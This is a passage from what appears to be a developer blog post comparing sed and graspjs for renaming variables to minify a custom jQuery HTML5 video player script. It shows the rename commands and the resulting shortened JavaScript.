        <span class="k">var</span> <span class="n">video</span> <span class="o">=</span> <span class="n">this</span><span class="p">,</span> <span class="n">videoTime</span> <span class="o">=</span> <span class="n">video</span><span class="o">.</span><span class="n">currentTime</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">isFullScreen</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">//</span> <span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">fullscreen</span> <span class="k">is</span> <span class="k">is</span> <span class="n">treated</span> <span class="n">a</span> <span class="n">boolean</span><span class="p">,</span> <span class="n">but</span> <span class="n">it</span> <span class="k">is</span> <span class="n">just</span> <span class="n">truthy</span> <span class="n">string</span>
                <span class="o">//</span> <span class="n">This</span> <span class="n">function</span> <span class="n">uses</span> <span class="n">a</span> <span class="n">standard</span> <span class="n">format</span> <span class="n">of</span> <span class="n">names</span> <span class="n">of</span> <span class="n">full</span> <span class="n">screen</span> <span class="n">appropriate</span> <span class="n">vids</span> <span class="k">as</span> <span class="n">shown</span> <span class="n">below</span><span class="p">:</span>
                <span class="o">//</span> <span class="n">original</span><span class="p">:</span> <span class="n">originalvid</span><span class="o">.</span><span class="n">xyz</span>            <span class="n">full</span> <span class="n">screen</span><span class="p">:</span> <span class="n">originalvid</span><span class="o">.</span><span class="n">fullscreen</span><span class="o">.</span><span class="n">xyz</span>
                <span class="o">//</span> <span class="n">N</span><span class="o">.</span><span class="n">B</span><span class="o">.</span> <span class="n">Can</span> <span class="ow">not</span> <span class="n">have</span> <span class="n">period</span> <span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="ow">in</span> <span class="n">original</span> <span class="n">file</span> <span class="n">same</span> <span class="n">except</span> <span class="k">for</span> <span class="n">filetype</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">fullscreen</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">var</span> <span class="n">splitSrc</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
                    <span class="n">this</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.fullscreen.&quot;</span> <span class="o">+</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
                <span class="p">}</span>
                <span class="n">video</span><span class="o">.</span><span class="n">load</span><span class="p">();</span>
            <span class="p">});</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">Have</span> <span class="n">left</span> <span class="n">fullscreen</span> <span class="ow">and</span> <span class="n">need</span> <span class="n">to</span> <span class="k">return</span> <span class="n">to</span> <span class="n">lower</span> <span class="n">res</span> <span class="n">video</span>
            <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">//</span> <span class="n">Remove</span> <span class="n">the</span> <span class="n">full</span> <span class="n">screen</span> <span class="ow">and</span> <span class="n">go</span> <span class="n">back</span> <span class="n">to</span> <span class="n">the</span> <span class="n">original</span> <span class="n">file</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">fullscreen</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">var</span> <span class="n">splitSrc</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
                    <span class="n">this</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">splitSrc</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
                <span class="p">}</span> <span class="o">//</span> <span class="n">Nothing</span> <span class="n">was</span> <span class="n">changed</span> <span class="k">if</span> <span class="n">data</span><span class="o">-</span><span class="n">fullscreen</span> <span class="k">is</span> <span class="bp">false</span> <span class="n">so</span> <span class="n">no</span> <span class="n">need</span> <span class="n">to</span> <span class="n">do</span> <span class="n">anything</span>

                <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">load</span><span class="p">();</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">video</span>
                <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">video</span> <span class="n">container</span> <span class="n">box</span>
            <span class="p">});</span>
        <span class="p">}</span>
        <span class="o">$</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;loadedmetadata&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">this</span><span class="o">.</span><span class="n">currentTime</span> <span class="o">=</span> <span class="n">videoTime</span><span class="p">;</span>  <span class="o">//</span> <span class="n">Skip</span> <span class="n">to</span> <span class="n">the</span> <span class="n">time</span> <span class="n">before</span> <span class="n">we</span> <span class="n">went</span> <span class="n">full</span> <span class="n">screen</span>
            <span class="n">playPause</span><span class="p">(</span><span class="n">video</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">});</span>
<span class="p">});</span>
<span class="o">$</span><span class="p">(</span><span class="n">window</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;resize&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="o">$</span><span class="p">(</span><span class="n">videos</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></div>


<p>});</p>
<div class="codehilite"><pre><span></span>A bit more complex and more involved. Set up with the usual sed treatment with one notable wrinkle.
</pre></div>


<p>:::bash
cat video.js &gt; temp.js</p>
<p>sed -i ''s/videos\b/z/g'' temp.js
sed -i ''s/video\b/y/g'' temp.js
sed -i ''s/"y"/"video"/1'' temp.js  # Undo the first (and only) "video" instance
sed -i ''s/playPauseButton/x/g'' temp.js
sed -i ''s/vidIndex/w/g'' temp.js
...</p>
<div class="codehilite"><pre><span></span><span class="n">The</span> <span class="n">second</span> <span class="n">sed</span> <span class="n">line</span> <span class="n">highlights</span> <span class="n">the</span> <span class="n">problem</span> <span class="n">here</span> <span class="k">as</span> <span class="n">it</span> <span class="n">can</span> <span class="ow">not</span> <span class="n">differentiate</span> <span class="n">between</span> <span class="err">`</span><span class="n">video</span><span class="o">.</span><span class="n">blah</span><span class="p">()</span><span class="err">`</span> <span class="ow">and</span> <span class="err">`</span><span class="k">var</span> <span class="n">videos</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;video&quot;</span><span class="p">);</span><span class="err">`</span><span class="o">.</span> <span class="n">This</span> <span class="k">is</span> <span class="n">pretty</span> <span class="n">common</span> <span class="p">(</span><span class="ow">and</span> <span class="k">is</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">use</span> <span class="n">cases</span> <span class="n">on</span> <span class="n">the</span> <span class="n">graspjs</span> <span class="n">website</span><span class="p">)</span><span class="o">.</span> <span class="n">The</span> <span class="n">sed</span> <span class="n">solution</span> <span class="n">to</span> <span class="n">the</span> <span class="n">sed</span> <span class="n">problem</span> <span class="k">is</span> <span class="n">to</span> <span class="n">go</span> <span class="ow">in</span> <span class="n">again</span> <span class="ow">and</span> <span class="n">turn</span> <span class="n">back</span> <span class="n">the</span> <span class="n">variable</span><span class="p">:</span> <span class="err">`</span><span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;s/&quot;y&quot;/&quot;video&quot;/1&#39;</span> <span class="n">temp</span><span class="o">.</span><span class="n">js</span>  <span class="c1"># Undo the first (and only) &quot;video&quot; instance`. Not very wieldy.</span>

<span class="n">Let</span><span class="s1">&#39;s do better:</span>
</pre></div>


<p>:::bash</p>
<h1 id="begin-the-smooshing-of-videojs">Begin the smooshing of video.js</h1>
<p>cat video.js &gt; temp.js</p>
<p>grasp -i ''#videos'' -R z temp.js
grasp -i ''#leftZeroPad'' -R y temp.js
grasp -i ''#numZeros'' -R x temp.js
grasp -i ''#zeros'' -R w temp.js
grasp -i ''#zeroString'' -R v temp.js
grasp -i ''#isVideoPlaying'' -R u temp.js
grasp -i ''#video'' -R t temp.js
grasp -i ''#playPause'' -R s temp.js
grasp -i ''#vid'' -R r temp.js
grasp -i ''#playPauseButton'' -R q temp.js
grasp -i ''#rawTimeToFormattedTime'' -R p temp.js
grasp -i ''#rawTime'' -R o temp.js
grasp -i ''#chomped'' -R n temp.js
grasp -i ''#seconds'' -R m temp.js
grasp -i ''#minutes'' -R l temp.js
grasp -i ''#$video'' -R k temp.js
grasp -i ''#$videoContainer'' -R j temp.js
grasp -i ''#$controlsBox'' -R i temp.js
grasp -i ''#$playPauseButton'' -R h temp.js
grasp -i ''#$progressBar'' -R g temp.js
grasp -i ''#$poster'' -R f temp.js
grasp -i ''#customPoster'' -R e temp.js
grasp -i ''#$endPoster'' -R d temp.js
grasp -i ''#customEndPoster'' -R c temp.js
grasp -i ''#$errorPoster'' -R b temp.js
grasp -i ''#$currentTimeSpan'' -R a temp.js
grasp -i ''#$durationTimeSpan'' -R zz temp.js
grasp -i ''#svg'' -R zy temp.js
grasp -i ''#canPlayVid'' -R zx temp.js
grasp -i ''#newText'' -R zw temp.js
grasp -i ''#link'' -R zv temp.js
grasp -i ''#videoContainerOffset'' -R zu temp.js
grasp -i ''#videoContainerWidth'' -R zt temp.js
grasp -i ''#heightsTogether'' -R zs temp.js
grasp -i ''#doc'' -R zr temp.js</p>
<div class="codehilite"><pre><span></span>This works out to:
</pre></div>


<p>:::javascript
$(document).ready(function () {
    "use strict";
    var z = $("video"), zr = document, zq;</p>
<div class="codehilite"><pre><span></span><span class="n">Number</span><span class="o">.</span><span class="n">prototype</span><span class="o">.</span><span class="n">y</span> <span class="o">=</span> <span class="n">function</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">n</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="n">this</span><span class="p">),</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">length</span><span class="p">),</span>
        <span class="n">v</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">pow</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">this</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">v</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="n">v</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">v</span> <span class="o">+</span> <span class="n">n</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">function</span> <span class="n">u</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">!</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">paused</span> <span class="o">||</span> <span class="n">t</span><span class="o">.</span><span class="n">ended</span> <span class="o">||</span> <span class="n">t</span><span class="o">.</span><span class="n">seeking</span> <span class="o">||</span> <span class="n">t</span><span class="o">.</span><span class="n">readyState</span> <span class="o">&lt;</span> <span class="n">t</span><span class="o">.</span><span class="n">HAVE_FUTURE_DATA</span><span class="p">);</span>
<span class="p">}</span>

<span class="o">//</span> <span class="n">Pass</span> <span class="ow">in</span> <span class="n">object</span> <span class="n">of</span> <span class="n">the</span> <span class="n">video</span> <span class="n">to</span> <span class="n">play</span><span class="o">/</span><span class="n">pause</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">control</span> <span class="n">box</span> <span class="n">associated</span> <span class="n">with</span> <span class="n">it</span>
<span class="n">function</span> <span class="n">s</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">q</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.playPauseButton&quot;</span><span class="p">,</span> <span class="n">t</span><span class="o">.</span><span class="n">parent</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">u</span><span class="p">(</span><span class="n">t</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">t</span><span class="o">.</span><span class="n">pause</span><span class="p">();</span>
        <span class="n">q</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/videoicons/smallplay.svg&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">t</span><span class="o">.</span><span class="n">play</span><span class="p">();</span>
        <span class="n">q</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/videoicons/smallpause.svg&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">function</span> <span class="n">p</span><span class="p">(</span><span class="n">o</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">l</span><span class="p">;</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">60</span><span class="p">;</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">n</span> <span class="o">/</span> <span class="mi">60</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">l</span><span class="o">.</span><span class="n">y</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">m</span><span class="o">.</span><span class="n">y</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="o">$</span><span class="p">(</span><span class="n">z</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">t</span> <span class="o">=</span> <span class="n">this</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="o">$</span><span class="n">startPoster</span><span class="p">,</span> <span class="n">startPoster</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">zz</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">controls</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">this</span><span class="o">.</span><span class="n">controls</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;timeupdate&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">currentTime</span> <span class="o">/</span> <span class="n">t</span><span class="o">.</span><span class="n">duration</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">;</span>
        <span class="n">a</span><span class="o">.</span><span class="n">text</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">currentTime</span><span class="p">));</span>

    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;loadedmetadata&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="k">var</span> <span class="n">zx</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
            <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">))</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">canPlayType</span><span class="p">(</span><span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">zx</span> <span class="o">=</span> <span class="bp">true</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">zx</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">b</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/movieerror.svg&quot;</span><span class="p">;</span>
                <span class="o">$.</span><span class="n">get</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">zy</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">b</span> <span class="o">=</span> <span class="n">zr</span><span class="o">.</span><span class="n">importNode</span><span class="p">(</span><span class="n">zy</span><span class="o">.</span><span class="n">documentElement</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>

                    <span class="o">$</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="s2">&quot;poster errorposter&quot;</span><span class="p">);</span>
                    <span class="o">$</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
                    <span class="o">$</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

                    <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">))</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                        <span class="k">var</span> <span class="n">zw</span> <span class="o">=</span> <span class="n">zr</span><span class="o">.</span><span class="n">createElementNS</span><span class="p">(</span><span class="s2">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">,</span> <span class="s2">&quot;tspan&quot;</span><span class="p">);</span>
                        <span class="k">var</span> <span class="n">zv</span> <span class="o">=</span> <span class="n">zr</span><span class="o">.</span><span class="n">createElementNS</span><span class="p">(</span><span class="s2">&quot;http://www.w3.org/2000/svg&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span>
                        <span class="n">zw</span><span class="o">.</span><span class="n">setAttributeNS</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;50%&quot;</span><span class="p">);</span>
                        <span class="n">zw</span><span class="o">.</span><span class="n">setAttributeNS</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span> <span class="s2">&quot;dy&quot;</span><span class="p">,</span> <span class="s2">&quot;1.2em&quot;</span><span class="p">);</span>
                        <span class="n">zv</span><span class="o">.</span><span class="n">setAttributeNS</span><span class="p">(</span><span class="s2">&quot;http://www.w3.org/1999/xlink&quot;</span><span class="p">,</span> <span class="s2">&quot;href&quot;</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="p">);</span>
                        <span class="n">zv</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">zr</span><span class="o">.</span><span class="n">createTextNode</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="p">));</span>
                        <span class="n">zw</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">zv</span><span class="p">);</span>

                        <span class="o">$</span><span class="p">(</span><span class="s2">&quot;#sorrytext&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">zw</span><span class="p">);</span>
                    <span class="p">});</span>

                    <span class="n">j</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
                    <span class="o">$</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
                <span class="p">});</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="o">$</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">currentTime</span><span class="p">));</span>
                <span class="o">$</span><span class="p">(</span><span class="n">zz</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">duration</span><span class="p">));</span>
            <span class="p">}</span>

        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">s</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;ended&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">i</span><span class="o">.</span><span class="n">css</span><span class="p">({</span><span class="s1">&#39;opacity&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">});</span>

            <span class="o">//</span> <span class="n">Poster</span> <span class="n">to</span> <span class="n">show</span> <span class="n">at</span> <span class="n">end</span> <span class="n">of</span> <span class="n">movie</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">endposter</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">c</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">endposter</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">c</span> <span class="o">=</span> <span class="s2">&quot;/media/site-images/endofmovie.svg&quot;</span><span class="p">;</span>  <span class="o">//</span> <span class="n">If</span> <span class="n">none</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">use</span> <span class="n">our</span> <span class="n">own</span><span class="p">,</span> <span class="n">generic</span> <span class="n">one</span>
            <span class="p">}</span>
            <span class="o">//</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">poster</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">inline</span>
            <span class="o">//</span> <span class="n">File</span> <span class="k">is</span> <span class="n">SVG</span> <span class="n">so</span> <span class="n">usual</span> <span class="n">jQuery</span> <span class="n">rules</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">apply</span>
            <span class="o">//</span> <span class="n">File</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">have</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">element</span> <span class="n">with</span> <span class="s2">&quot;playButton&quot;</span> <span class="k">as</span> <span class="k">class</span>
            <span class="o">$.</span><span class="n">get</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">zy</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">d</span> <span class="o">=</span> <span class="n">zr</span><span class="o">.</span><span class="n">importNode</span><span class="p">(</span><span class="n">zy</span><span class="o">.</span><span class="n">documentElement</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>
                <span class="n">d</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>

                <span class="n">d</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="s2">&quot;poster endposter&quot;</span><span class="p">);</span>
                <span class="n">d</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
                <span class="n">d</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

                <span class="o">$</span><span class="p">(</span><span class="s2">&quot;#playButton&quot;</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                    <span class="n">s</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
                    <span class="n">d</span><span class="o">.</span><span class="n">remove</span><span class="p">();</span> <span class="o">//</span> <span class="n">done</span> <span class="n">with</span> <span class="n">poster</span> <span class="n">forever</span>
                <span class="p">});</span>
                <span class="n">j</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
                <span class="o">$</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;play&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>

        <span class="p">});</span>

    <span class="o">//</span> <span class="n">Setup</span> <span class="n">the</span> <span class="n">div</span> <span class="n">container</span> <span class="k">for</span> <span class="n">the</span> <span class="n">video</span><span class="p">,</span> <span class="n">controls</span> <span class="ow">and</span> <span class="n">poster</span>
    <span class="n">j</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">wrap</span><span class="p">(</span>
        <span class="o">$</span><span class="p">(</span><span class="s1">&#39;&lt;div&gt;&lt;/div&gt;&#39;</span><span class="p">,</span> <span class="p">{</span>
            <span class="k">class</span><span class="p">:</span> <span class="s1">&#39;videoContainer&#39;</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mouseenter&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
